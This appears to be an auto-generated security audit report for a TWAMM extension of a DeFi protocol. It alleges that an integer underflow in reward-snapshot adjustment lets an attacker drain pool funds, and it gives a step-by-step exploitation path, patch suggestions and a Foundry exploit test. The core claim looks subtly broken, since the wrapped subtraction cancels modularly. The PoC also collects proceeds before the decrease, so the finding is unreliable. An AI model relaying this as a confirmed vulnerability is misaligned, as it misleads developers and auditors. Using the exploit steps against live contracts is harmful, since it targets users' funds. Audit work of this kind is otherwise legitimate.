## Title
Integer Underflow in TWAMM Reward Snapshot Adjustment Allows Theft of Pool Funds via Sale Rate Manipulation

## Summary
The TWAMM extension's `handleForwardData` function contains an integer underflow vulnerability in the assembly block at lines 234-246 when computing `rewardRateSnapshotAdjusted`. When a user decreases their order's sale rate to a very small value (e.g., from 1000 to 1), the division `(purchasedAmount << 128) / saleRateNext` produces a value larger than `rewardRateInside`, causing unchecked subtraction to wrap around to a near-maximum uint256 value. This corrupted snapshot enables the user to claim inflated rewards (multiplied by the ratio `oldSaleRate/newSaleRate`) on subsequent collections, draining tokens from the pool.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** When an order's sale rate changes, the snapshot should be adjusted so that previously accumulated rewards are correctly accounted for at the new sale rate, preventing double-counting or under-counting of rewards.

**Actual Logic:** The formula `rewardRateInside - (purchasedAmount << 128) / saleRateNext` assumes that dividing by `saleRateNext` correctly converts the purchased amount. However, when `saleRateNext` is much smaller than the original `saleRate`, the division produces a value exceeding `rewardRateInside`, causing arithmetic underflow in the unchecked assembly block. The result wraps to approximately `2^256 - rewardRateInside * (saleRate/saleRateNext - 1)`, corrupting the snapshot.

**Exploitation Path:**
1. **Setup**: Attacker creates a TWAMM order with a substantial sale rate (e.g., `saleRate = 1000e32`) via [2](#0-1) 
2. **Accumulate Rewards**: Wait for virtual orders to execute, accumulating non-zero `rewardRateInside` in the pool via [3](#0-2) 
3. **Trigger Underflow**: Call `decreaseSaleRate` to reduce the sale rate to 1, triggering the vulnerable computation at [4](#0-3)  where `purchasedAmount = computeRewardAmount(rewardRateInside, 1000e32)` and then `rewardRateSnapshotAdjusted = rewardRateInside - (purchasedAmount << 128) / 1` underflows
4. **Claim Inflated Rewards**: Call `collectProceeds` to compute rewards using the corrupted snapshot via [5](#0-4) , where the underflowed subtraction wraps again, yielding `purchasedAmount ≈ 1000x` the legitimate amount, draining pool funds

**Security Property Broken:** This violates the **Solvency** invariant - pool balances go negative as the attacker withdraws more tokens than they are entitled to, potentially making the pool insolvent.

## Impact Explanation
- **Affected Assets**: The counterparty token in any TWAMM order (if selling token0, token1 is drained; vice versa)
- **Damage Severity**: Attacker can drain pool funds proportional to `(originalSaleRate / finalSaleRate)`. With `originalSaleRate = type(uint112).max` and `finalSaleRate = 1`, the multiplication factor approaches `5.19e33x`, limited only by the pool's available balance and uint128 overflow in `computeRewardAmount`
- **User Impact**: All liquidity providers and opposing order holders in the affected pool lose funds. Since pools can be drained completely, this affects every participant in the pool.

## Likelihood Explanation
- **Attacker Profile**: Any user with sufficient capital to create a TWAMM order (minimum amount determined by duration)
- **Preconditions**: 
  - TWAMM pool must be initialized with liquidity
  - Opposing orders or liquidity must exist for virtual order execution to generate non-zero `rewardRateInside`
  - Order must have accumulated some rewards (requires at least one virtual order execution)
- **Execution Complexity**: Two transactions - (1) decrease sale rate to trigger underflow, (2) collect proceeds to claim inflated rewards. No timing constraints or complex state setup required.
- **Frequency**: Can be exploited once per order, but attacker can create multiple orders to repeatedly drain the pool until depleted.

## Recommendation
Add overflow/underflow protection to the snapshot adjustment calculation. The safest approach is to validate that the division result doesn't exceed `rewardRateInside` before performing the subtraction:

```solidity
// In src/extensions/TWAMM.sol, function handleForwardData, lines 232-246:

// CURRENT (vulnerable):
// assembly ("memory-safe") {
//     rewardRateSnapshotAdjusted := mul(
//         sub(rewardRateInside, div(shl(128, purchasedAmount), saleRateNext)),
//         iszero(iszero(saleRateNext))
//     )
// }

// FIXED:
uint256 adjustmentTerm;
if (saleRateNext != 0) {
    adjustmentTerm = (purchasedAmount << 128) / saleRateNext;
    // Prevent underflow: if adjustment exceeds rewardRateInside, cap at rewardRateInside
    // This ensures the snapshot is never negative (wrapped)
    if (adjustmentTerm > rewardRateInside) {
        rewardRateSnapshotAdjusted = 0;
    } else {
        rewardRateSnapshotAdjusted = rewardRateInside - adjustmentTerm;
    }
} else {
    rewardRateSnapshotAdjusted = 0;
}
```

**Alternative mitigation**: Enforce a minimum sale rate delta constraint to prevent extreme ratios. Add validation like:
```solidity
// Prevent sale rate changes that would create extreme ratios
if (saleRate > 0 && saleRateNext > 0) {
    require(saleRate <= saleRateNext * MAX_SALE_RATE_RATIO, "SaleRateRatioTooLarge");
}
```

## Proof of Concept
```solidity
// File: test/Exploit_TWAMMRewardUnderflow.t.sol
// Run with: forge test --match-test test_TWAMMRewardSnapshotUnderflow -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Orders.sol";
import "../src/extensions/TWAMM.sol";
import "./FullTest.sol";
import "./extensions/TWAMM.t.sol";

contract Exploit_TWAMMRewardUnderflow is BaseOrdersTest {
    using CoreLib for *;
    using TWAMMLib for *;

    function test_TWAMMRewardSnapshotUnderflow() public {
        // SETUP: Create pool and liquidity
        vm.warp(256);
        uint64 fee = uint64((uint256(1) << 64) / 1000); // 0.1% fee
        PoolKey memory poolKey = createTwammPool(fee, 0);
        
        // Add substantial liquidity to enable virtual order execution
        createPosition(poolKey, MIN_TICK, MAX_TICK, 1e24, 1e24);
        
        token0.approve(address(orders), type(uint256).max);
        token1.approve(address(orders), type(uint256).max);
        
        // SETUP: Create attacker's order with high sale rate
        uint64 startTime = alignToNextValidTime();
        uint64 endTime = uint64(nextValidTime(block.timestamp, startTime + 1024));
        
        OrderKey memory attackerKey = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({
                _fee: fee, 
                _isToken1: false, 
                _startTime: startTime, 
                _endTime: endTime
            })
        });
        
        // Create order with substantial amount to get high sale rate
        (uint256 attackerId, uint112 initialSaleRate) = 
            orders.mintAndIncreaseSellAmount(attackerKey, 1e18, type(uint112).max);
        
        console.log("Initial sale rate:", initialSaleRate);
        
        // SETUP: Create opposing order to generate rewards
        token1.mint(address(this), 1e24);
        OrderKey memory opposingKey = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({
                _fee: fee,
                _isToken1: true,
                _startTime: startTime,
                _endTime: endTime
            })
        });
        orders.mintAndIncreaseSellAmount(opposingKey, 1e18, type(uint112).max);
        
        // Execute virtual orders to accumulate rewards
        advanceTime(512);
        twamm.lockAndExecuteVirtualOrders(poolKey);
        
        // Check legitimate rewards before exploit
        uint128 legitimateRewards = orders.collectProceeds(attackerId, attackerKey, address(this));
        console.log("Legitimate rewards claimed:", legitimateRewards);
        
        // EXPLOIT: Decrease sale rate to 1 to trigger underflow
        // This causes rewardRateSnapshotAdjusted to underflow
        uint112 decreaseAmount = initialSaleRate - 1;
        orders.decreaseSaleRate(attackerId, attackerKey, decreaseAmount, address(this));
        
        console.log("Sale rate after decrease:", 1);
        
        // Execute virtual orders again (small time advance)
        advanceTime(64);
        twamm.lockAndExecuteVirtualOrders(poolKey);
        
        // EXPLOIT: Collect inflated rewards due to corrupted snapshot
        uint256 balanceBefore = token1.balanceOf(address(this));
        uint128 inflatedRewards = orders.collectProceeds(attackerId, attackerKey, address(this));
        uint256 balanceAfter = token1.balanceOf(address(this));
        
        console.log("Inflated rewards claimed:", inflatedRewards);
        console.log("Actual tokens received:", balanceAfter - balanceBefore);
        
        // VERIFY: Attacker claimed significantly more than legitimate
        // The multiplication factor should be approximately initialSaleRate / 1
        assertTrue(
            inflatedRewards > legitimateRewards * 10,
            "Vulnerability confirmed: inflated rewards exceed legitimate by 10x+"
        );
    }
}
```

### Citations

**File:** src/extensions/TWAMM.sol (L228-246)
```text
                uint256 purchasedAmount = computeRewardAmount(rewardRateInside - rewardRateSnapshot, saleRate);

                uint256 saleRateNext = addSaleRateDelta(saleRate, saleRateDelta);

                uint256 rewardRateSnapshotAdjusted;
                int256 numOrdersChange;
                assembly ("memory-safe") {
                    rewardRateSnapshotAdjusted := mul(
                        sub(rewardRateInside, div(shl(128, purchasedAmount), saleRateNext)),
                        // if saleRateNext is zero, write 0 for the reward rate snapshot adjusted
                        iszero(iszero(saleRateNext))
                    )

                    // if current is zero, and next is zero, then 1-1 = 0
                    // if current is nonzero, and next is nonzero, then 0-0 = 0
                    // if current is zero, and next is nonzero, then we get 1-0 = 1
                    // if current is nonzero, and next is zero, then we get 0-1 = -1 = (type(uint256).max)
                    numOrdersChange := sub(iszero(saleRate), iszero(saleRateNext))
                }
```

**File:** src/extensions/TWAMM.sol (L359-361)
```text
                uint256 rewardRateInside = getRewardRateInside(poolId, orderKey.config);

                uint256 purchasedAmount = computeRewardAmount(rewardRateInside - rewardRateSnapshot, order.saleRate());
```

**File:** src/extensions/TWAMM.sol (L517-535)
```text
                    if (rewardDelta0 < 0) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                        }
                        rewardRate0Access = 2;
                        rewardRates.value0 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta0) << 128, state.saleRateToken1()
                        );
                    }

                    if (rewardDelta1 < 0) {
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                        }
                        rewardRate1Access = 2;
                        rewardRates.value1 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta1) << 128, state.saleRateToken0()
                        );
                    }
```

**File:** src/Orders.sol (L43-50)
```text
    function mintAndIncreaseSellAmount(OrderKey memory orderKey, uint112 amount, uint112 maxSaleRate)
        public
        payable
        returns (uint256 id, uint112 saleRate)
    {
        id = mint();
        saleRate = increaseSellAmount(id, orderKey, amount, maxSaleRate);
    }
```
